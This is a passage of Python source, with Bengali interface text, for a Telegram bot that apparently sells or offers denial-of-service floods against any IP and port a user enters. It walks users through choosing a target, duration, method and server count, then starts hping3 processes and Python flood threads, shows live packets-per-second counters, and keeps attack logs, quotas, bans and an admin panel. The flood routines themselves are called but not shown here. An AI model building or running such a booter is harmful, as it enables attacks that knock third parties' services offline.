    except ValueError:
        await q.edit_message_text("⚠️ ভুল সার্ভার সংখ্যা।")
        return
    if srv < 1 or srv > MAX_SERVER_COUNT:
        await q.edit_message_text(f"⚠️ সার্ভার সংখ্যা ১ থেকে {MAX_SERVER_COUNT} এর মধ্যে হতে হবে।")
        return
    u = q.from_user
    if not is_admin(u.id) and srv > FREE_USER_MAX_SERVERS:
        await q.edit_message_text(
            f"⚠️ আপনার জন্য সর্বোচ্চ সার্ভার সংখ্যা {FREE_USER_MAX_SERVERS}।"
        )
        return
    context.user_data["server_count"] = srv
    context.user_data["state"] = "await_confirm"
    ip = context.user_data.get("target_ip")
    port = context.user_data.get("target_port")
    dur = context.user_data.get("duration")
    method = context.user_data.get("method")
    total_senders = srv * SENDERS_PER_SERVER
    engine_line = "hping3 + 10X পাইথন থ্রেড" if HPING3_AVAILABLE else "১০ গুণ হাইপার পাইথন থ্রেড"
    await q.edit_message_text(
        "⚠️ *অ্যাটাক নিশ্চিত করুন (10X Power)*\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 টার্গেট: `{ip}:{port}`\n"
        f"⚡ মেথড: `{method}`\n"
        f"⏱️ সময়কাল: `{dur}s`\n"
        f"🖥️ সার্ভার: `{srv}`\n"
        f"📤 মোট সেন্ডার: `{total_senders}`\n"
        f"⚙️ ইঞ্জিন: {engine_line}\n\n"
        "শুরু করতে নিচে চাপুন:",
        parse_mode="Markdown",
        reply_markup=confirm_keyboard()
    )

@safe_call
async def cb_confirm(update, context):
    q = update.callback_query
    await q.answer()
    u = q.from_user
    if user_is_banned(u.id):
        await q.edit_message_text("🚫 আপনি ব্যান আছেন।")
        return
    ip = context.user_data.get("target_ip")
    port = context.user_data.get("target_port")
    dur = context.user_data.get("duration")
    method = context.user_data.get("method")
    srv = context.user_data.get("server_count", 5)
    if not all([ip, port, dur, method]):
        await q.edit_message_text("⚠️ তথ্য অসম্পূর্ণ। /launch ব্যবহার করুন।")
        return

    cfg = AttackConfig()
    cfg.target_ip = ip
    cfg.target_port = port
    cfg.duration = dur
    cfg.method = method
    cfg.setup(srv)
    cfg.is_running = True
    cfg.start_time = time.time()
    cfg.attack_id = gen_attack_id(u.id)
    cfg.owner_id = u.id
    cfg.owner_name = u.username or u.first_name or str(u.id)
    context.user_data["cfg"] = cfg
    context.user_data["state"] = None

    hping_started = False
    if HPING3_AVAILABLE:
        try:
            hping_started = start_hping3(cfg)
        except Exception as e:
            logger.error(f"hping3 start failed: {e}")

    run_python_flood(cfg)

    engine_status = "hping3 + 10X পাইথন থ্রেড" if hping_started else "১০ গুণ হাইপার পাইথন থ্রেড"

    started_msg = await q.message.reply_text(
        "🚀 *অ্যাটাক সফলভাবে শুরু হয়েছে! (10X Hyper-Power)*\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 আইডি: `{cfg.attack_id}`\n"
        f"🎯 টার্গেট: `{cfg.target_ip}:{cfg.target_port}`\n"
        f"⏱️ সময়কাল: `{cfg.duration}s`\n"
        f"⚡ মেথড: `{cfg.method}`\n"
        f"🖥️ সার্ভার: `{cfg.server_count}`\n"
        f"📤 সেন্ডার: `{cfg.total_senders}`\n"
        f"⚙️ ইঞ্জিন: {engine_status}",
        parse_mode="Markdown"
    )
    await q.message.reply_text("চালিয়ে যেতে বাটন ব্যবহার করুন:", reply_markup=main_menu_keyboard())

    chat_id = q.message.chat_id
    msg_id = started_msg.message_id
    user_id = u.id
    username = cfg.owner_name

    async def status_loop():
        try:
            while cfg.is_running:
                try:
                    elapsed = max(0.001, time.time() - (cfg.start_time or time.time()))
                    remaining = max(0, int(cfg.duration - elapsed))
                    if remaining <= 0:
                        break
                    total_sent = cfg.total_sent()
                    pps = int(total_sent / elapsed)
                    cfg.last_pps = pps
                    cfg.pps_history.append(pps)
                    avg_pps = int(sum(cfg.pps_history) / len(cfg.pps_history)) if cfg.pps_history else 0
                    await context.bot.edit_message_text(
                        chat_id=chat_id, message_id=msg_id,
                        text=(
                            "🚀 *অ্যাটাক চলমান আছে (10X পাওয়ার)*\n"
                            "━━━━━━━━━━━━━━━━━━━━\n"
                            f"🆔 আইডি: `{cfg.attack_id}`\n"
                            f"🎯 টার্গেট: `{cfg.target_ip}:{cfg.target_port}`\n"
                            f"⏱️ সময়কাল: `{cfg.duration}s`\n"
                            f"⚡ মেথড: `{cfg.method}`\n"
                            f"🖥️ সার্ভার: `{cfg.server_count}`\n"
                            f"📤 সেন্ডার: `{cfg.total_senders}`\n"
                            f"⚙️ hping3 প্রসেস: `{len(cfg.hping_procs)}`\n"
                            f"📤 মোট পাঠানো: `{fmt_num(total_sent)}`\n"
                            f"📈 গতি: `{fmt_num(pps)}/s` (গড় `{fmt_num(avg_pps)}/s`)\n"
                            f"⏳ বাকি সময়: `{fmt_elapsed(remaining)}`\n"
                            f"❌ এরর: `{cfg.error_count}`"
                        ),
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass
                await asyncio.sleep(STATUS_UPDATE_INTERVAL)
        except Exception as e:
            logger.error(f"status_loop error: {e}")
        finally:
            await stop_all(cfg)
            total_sent = cfg.total_sent()
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id, message_id=msg_id,
                    text=(
                        "✅ *অ্যাটাক সম্পন্ন হয়েছে! (10X পাওয়ার)*\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        f"🆔 আইডি: `{cfg.attack_id}`\n"
                        f"🎯 টার্গেট: `{cfg.target_ip}:{cfg.target_port}`\n"
                        f"⏱️ সময়কাল: `{cfg.duration}s`\n"
                        f"⚡ মেথড: `{cfg.method}`\n"
                        f"🖥️ সার্ভার: `{cfg.server_count}`\n"
                        f"📤 সেন্ডার: `{cfg.total_senders}`\n"
                        f"📤 মোট পাঠানো: `{fmt_num(total_sent)}`\n"
                        f"❌ এরর: `{cfg.error_count}`"
                    ),
                    parse_mode="Markdown"
                )
            except Exception:
                pass
            add_log(user_id, username, cfg.method,
                    f"{cfg.target_ip}:{cfg.target_port}",
                    cfg.duration, "finished")
            user_inc_attack(user_id, cfg.duration)

    asyncio.create_task(status_loop())

@safe_call
async def cb_stop(update, context):
    q = update.callback_query
    await q.answer()
    cfg = context.user_data.get("cfg")
    if cfg and cfg.is_running:
        await stop_all(cfg)
        await q.edit_message_text("🛑 সফলভাবে অ্যাটাক বন্ধ করা হয়েছে।")
    else:
        await q.edit_message_text("⚠️ বন্ধ করার মতো কোনো চলমান অ্যাটাক নেই।")

@safe_call
async def cb_status(update, context):
    q = update.callback_query
    await q.answer()
    cfg = context.user_data.get("cfg")
    if not cfg:
        await q.edit_message_text("⚠️ কোনো সক্রিয় অ্যাটাক নেই।")
        return
    elapsed = max(0.001, time.time() - (cfg.start_time or time.time()))
    remaining = max(0, int(cfg.duration - elapsed))
    total_sent = cfg.total_sent()
    pps = int(total_sent / elapsed)
    await q.edit_message_text(
        f"📊 *অ্যাটাক স্ট্যাটাস*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 আইডি: `{cfg.attack_id}`\n"
        f"🎯 টার্গেট: `{cfg.target_ip}:{cfg.target_port}`\n"
        f"⏱️ সময়কাল: `{cfg.duration}s`\n"
        f"⚡ মেথড: `{cfg.method}`\n"
        f"🖥️ সার্ভার: `{cfg.server_count}`\n"
        f"📤 পাঠানো: `{fmt_num(total_sent)}` (`{fmt_num(pps)}/s`)\n"
        f"⏳ বাকি সময়: `{fmt_elapsed(remaining)}`",
        parse_mode="Markdown"
    )

@safe_call
async def cb_history(update, context):
    q = update.callback_query
    await q.answer()
    logs = get_logs(10)
    if not logs:
        await q.edit_message_text("📜 কোনো অ্যাটাক ইতিহাস নেই।")
        return
    text = "📜 *শেষ ১০টি অ্যাটাক ইতিহাস*\n━━━━━━━━━━━━━━━━━━━━\n"
    for log in logs:
        text += (
            f"🆔 `{log[0]}` | 👤 `{log[1]}`\n"
            f"🎯 `{log[3]}` | ⚡ `{log[2]}`\n"
            f"⏱️ `{log[4]}s` | 📌 `{log[5]}`\n"
            f"📅 `{log[6]}`\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
        )
    await q.edit_message_text(text, parse_mode="Markdown")

@safe_call
async def cb_profile(update, context):
    q = update.callback_query
    await q.answer()
    info = user_get(q.from_user.id)
    if not info:
        await q.edit_message_text("⚠️ প্রোফাইল পাওয়া যায়নি।")
        return
    await q.edit_message_text(
        f"👤 *আপনার প্রোফাইল*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 আইডি: `{info['user_id']}`\n"
        f"👤 নাম: `{info['username']}`\n"
        f"💎 কোটা: `{info['quota']}`\n"
        f"🚫 ব্যান: `{'হ্যাঁ' if info['is_banned'] else 'না'}`\n"
        f"🚀 মোট অ্যাটাক: `{info['total_attacks']}`\n"
        f"⏱️ মোট সেকেন্ড: `{info['total_seconds']}`\n"
        f"📅 প্রথম দেখা: `{info['first_seen']}`",
        parse_mode="Markdown"
    )

@safe_call
async def cb_cancel(update, context):
    q = update.callback_query
    await q.answer()
    context.user_data.clear()
    await q.edit_message_text("❌ অপারেশন বাতিল করা হয়েছে।")

@safe_call
async def cb_menu(update, context):
    q = update.callback_query
    await q.answer()
    text = (
        "👋 *মূল মেনু (10X Power & Safety)*\n\n"
        "নিচের অপশনগুলো থেকে বেছে নিন:"
    )
    await q.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard())

# =========================================================
# admin callbacks
# =========================================================
@safe_call
async def cb_admin_menu(update, context):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        await q.edit_message_text("🚫 আপনি অ্যাডমিন নন।")
        return
    await q.edit_message_text("⚙️ *অ্যাডমিন প্যানেল*\nঅপশন নির্বাচন করুন:", parse_mode="Markdown", reply_markup=admin_keyboard())

@safe_call
async def cb_admin_users(update, context):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        await q.edit_message_text("🚫 আপনি অ্যাডমিন নন।")
        return
    rows = db_exec("SELECT user_id, username, quota, is_banned, total_attacks FROM users LIMIT 30")
    if not rows:
        await q.edit_message_text("কোনো ইউজার পাওয়া যায়নি।")
        return
    text = "👥 *ইউজার তালিকা (শীর্ষ ৩০)*\n━━━━━━━━━━━━━━━━━━━━\n"
    for r in rows:
        ban = "🚫" if r[3] else "✅"
        text += f"{ban} `{r[0]}` | `{r[1]}` | q:`{r[2]}` | a:`{r[4]}`\n"
    await q.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_keyboard())

@safe_call
async def cb_admin_ban(update, context):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    context.user_data["state"] = "admin_ban"
    await q.edit_message_text("ব্যান করার জন্য ইউজারের আইডি দিন:", parse_mode="Markdown")

@safe_call
async def cb_admin_unban(update, context):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    context.user_data["state"] = "admin_unban"
    await q.edit_message_text("আনব্যান করার জন্য ইউজারের আইডি দিন:", parse_mode="Markdown")

@safe_call
async def cb_admin_stats(update, context):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    users = db_exec("SELECT COUNT(*) FROM users")[0][0]
    attacks = db_exec("SELECT COUNT(*) FROM logs")[0][0]
    banned = db_exec("SELECT COUNT(*) FROM users WHERE is_banned=1")[0][0]
    admins = len(admin_list()) + 1
    await q.edit_message_text(
        f"📊 *গ্লোবাল স্ট্যাটস*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 মোট ইউজার: `{users}`\n"
        f"🚀 মোট অ্যাটাক: `{attacks}`\n"
        f"🚫 ব্যানকৃত: `{banned}`\n"
        f"⚙️ অ্যাডমিন: `{admins}`",
        parse_mode="Markdown", reply_markup=admin_keyboard()
    )

# =========================================================
# text handler
# =========================================================
@safe_call
async def text_handler(update, context):
    state = context.user_data.get("state")
    text = update.message.text.strip()
    u = update.effective_user

    if state == "admin_ban" and is_admin(u.id):
        try:
            uid = int(text)
            db_exec("UPDATE users SET is_banned=1 WHERE user_id=?", (uid,))
            await update.message.reply_text(f"🚫 ইউজার `{uid}` কে ব্যান করা হয়েছে।", parse_mode="Markdown")
        except Exception:
            await update.message.reply_text("⚠️ ভুল আইডি।")
        context.user_data["state"] = None
        return
    if state == "admin_unban" and is_admin(u.id):
        try:
            uid = int(text)
            db_exec("UPDATE users SET is_banned=0 WHERE user_id=?", (uid,))
            await update.message.reply_text(f"✅ ইউজার `{uid}` কে আনব্যান করা হয়েছে।", parse_mode="Markdown")
        except Exception:
            await update.message.reply_text("⚠️ ভুল আইডি।")
        context.user_data["state"] = None
        return

    if state == "await_ip":
        if not valid_ip(text):
            await update.message.reply_text(
                "⚠️ ভুল আইপি অ্যাড্রেস। উদাহরণ: `127.0.0.1`",
                parse_mode="Markdown"
            )
            return
        context.user_data["target_ip"] = text
        context.user_data["state"] = "await_port"
        await update.message.reply_text(
            "🚀 *অ্যাটাক শুরু - ধাপ ২/৫*\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 আইপি: `{text}`\n\n"
            "টার্গেট পোর্ট দিন:\n\n"
            "উদাহরণ: `80` বা `443`",
            parse_mode="Markdown"
        )
        return

    if state == "await_port":
        try:
            port = int(text)
            if not (1 <= port <= 65535):
                raise ValueError
        except ValueError:
            await update.message.reply_text(
                "⚠️ ভুল পোর্ট। ১ থেকে ৬৫৫৩৫ এর মধ্যে একটি সংখ্যা দিন।",
                parse_mode="Markdown"
            )
            return
        context.user_data["target_port"] = port
        context.user_data["state"] = "await_duration"
        await update.message.reply_text(
            "🚀 *অ্যাটাক শুরু - ধাপ ৩/৫*\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 আইপি: `{context.user_data['target_ip']}`\n"
            f"🔌 পোর্ট: `{port}`\n\n"
            "অ্যাটাকের সময়কাল সিলেক্ট করুন:",
            parse_mode="Markdown",
            reply_markup=duration_keyboard()
        )
        return

# =========================================================
# main
# =========================================================
def main():
    init_db()
    admin_add(OWNER_ID)
    
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .read_timeout(30)
        .write_timeout(30)
        .connect_timeout(30)
        .pool_timeout(30)
        .build()
    )

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("launch", launch_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("history", history_cmd))
    app.add_handler(CommandHandler("profile", profile_cmd))

    app.add_handler(CallbackQueryHandler(cb_main_menu, pattern="^menu$"))
    app.add_handler(CallbackQueryHandler(cb_safety_menu, pattern="^safety_menu$"))
    app.add_handler(CallbackQueryHandler(cb_start_defense, pattern="^start_defense$"))
    app.add_handler(CallbackQueryHandler(cb_stop_defense, pattern="^stop_defense$"))
    app.add_handler(CallbackQueryHandler(cb_defense_status, pattern="^defense_status$"))

    app.add_handler(CallbackQueryHandler(cb_launch, pattern="^launch$"))
    app.add_handler(CallbackQueryHandler(cb_duration, pattern="^dur_"))
    app.add_handler(CallbackQueryHandler(cb_method, pattern="^method_"))
    app.add_handler(CallbackQueryHandler(cb_server, pattern="^srv_"))
    app.add_handler(CallbackQueryHandler(cb_confirm, pattern="^confirm_launch$"))
    app.add_handler(CallbackQueryHandler(cb_stop, pattern="^stop$"))
    app.add_handler(CallbackQueryHandler(cb_status, pattern="^status$"))
    app.add_handler(CallbackQueryHandler(cb_history, pattern="^history$"))
    app.add_handler(CallbackQueryHandler(cb_profile, pattern="^profile$"))
    app.add_handler(CallbackQueryHandler(cb_cancel, pattern="^cancel$"))

    app.add_handler(CallbackQueryHandler(cb_admin_menu, pattern="^admin_menu$"))
    app.add_handler(CallbackQueryHandler(cb_admin_users, pattern="^admin_users$"))
    app.add_handler(CallbackQueryHandler(cb_admin_ban, pattern="^admin_ban$"))
    app.add_handler(CallbackQueryHandler(cb_admin_unban, pattern="^admin_unban$"))
    app.add_handler(CallbackQueryHandler(cb_admin_stats, pattern="^admin_stats$"))

    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    engine = "hping3 + 10X পাইথন" if HPING3_AVAILABLE else "শুধুমাত্র ১০ গুণ হাইপার পাইথন"
    logger.info(f"🚀 বট চালু হয়েছে | ইঞ্জিন: {engine} | সিপিইউ: {CPU_COUNT}")
    app.run_polling()

if __name__ == "__main__":
    if IS_WINDOWS:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    main()
